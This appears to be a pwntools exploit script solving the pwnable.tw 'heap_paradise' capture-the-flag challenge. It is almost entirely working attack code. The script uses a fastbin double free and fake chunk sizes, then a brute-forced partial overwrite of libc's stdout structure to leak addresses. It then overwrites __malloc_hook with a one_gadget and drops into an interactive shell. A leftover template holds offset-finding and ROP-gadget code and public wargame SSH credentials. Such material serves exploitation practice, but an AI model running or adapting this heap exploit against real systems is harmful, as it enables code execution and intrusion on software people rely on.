from pwn import *
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './heap_paradise_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN, level='debug') # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10308) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')


#
# ##########################
# ##### OFFSET FINDER ######
# ##########################
#
# OFFSET = b'' #b'A'*264
# if OFFSET == b'':
#     gdb.attach(P.pid, 'c') #Attach and continue
#     payload = cyclic(264)
#     payload += b'AAAAAAAA'
#     print(P.clean())
#     P.sendline(payload)
#     #x/wx  -- Search for bytes that crashed the application
#     #print(cyclic_find(0x63616171)) # Find the offset of those bytes
#     P.interactive()
#     exit()
#
#
#
# #####################
# #### Find Gadgets ###
# #####################
# try:
#     libc_func = 'puts'
#     PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
# except:
#     libc_func = 'printf'
#     PUTS_PLT = ELF_LOADED.plt['printf']
#
# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('Puts plt: ' + hex(PUTS_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))
#
#


##########################
##### FUNCTION ######
##########################

def add(size, content):
    P.sendlineafter(b'Choice:',b'1')
    P.sendlineafter(b'Size :',str(size).encode())
    P.sendafter(b'Data :', content)


def free(index):
        P.sendlineafter(b'Choice:',b'2')
        P.sendlineafter(b'Index :', str(index).encode())


##############################
##### FINAL EXPLOITATION #####
##############################
while True:
    add(0x60,b'a'*0x10+b'\x00'*0x8+p64(0x71))  #0
    add(0x60,b'a'*0x10+b'\x00'*0x8+p64(0x71)+b'\x00'*0x28+p64(0x21))                              #1
    free(0)
    free(1)
    free(0)

    add(0x60,b'\x20')   #2 ->0
    add(0x60,b'a')      #3  ->1
    add(0x60,b'a')      #4 ->0
    add(0x60,b'a')      #5 ->fake_chunk
    free(4)

    add(0x60, b'a'*0x10+b'\x00'*0x8+p64(0xa1)) #-> change chunk 5 to unsorted bin size
    free(5)

    free(0)
    free(1)

    add(0x70, b'f' * 0x40 + p64(0) + p64(0x71) + b'\xa0' ) # 7
    free(7)

    add(0x68, b'b' * 0x20 + p64(0) + p64(0x71) +b'\xdd\x35') # 8
    # pause()
    add(0x68, b'\0') # 9
    # _IO_CURRENTLY_PUTTING | _IO_IS_APPENDING
    try:
        add(0x68, b'\0' * 3 + p64(0) * 6 + p64(0xfbad2087 +0x1800) + p64(0) * 3 + b'\x80') # 10
    except Exception as e:
        P.close()
        P = remote('chall.pwnable.tw', 10308)
        continue
    if b'\x00' not in P.recv(8):
        P.close()
        P = remote('chall.pwnable.tw', 10308)
        continue
    # gdb.attach(P.pid)
    LIBC.address = u64(P.recv(8)) - LIBC.symbols['_IO_2_1_stdin_']
    print(hex(LIBC.address))
    one_gadget = [0x45216,0x4526a,0xef6c4,0xf0567]
    free(1)
    add(0x70, b'f' * 0x40 + p64(0) + p64(0x71) +p64(LIBC.symbols['__malloc_hook']-0x23))  # 7
    add(0x60, b'a'*0x13)
    add(0x60, b'a'*0x13+p64(LIBC.address+one_gadget[2]))

    P.interactive()




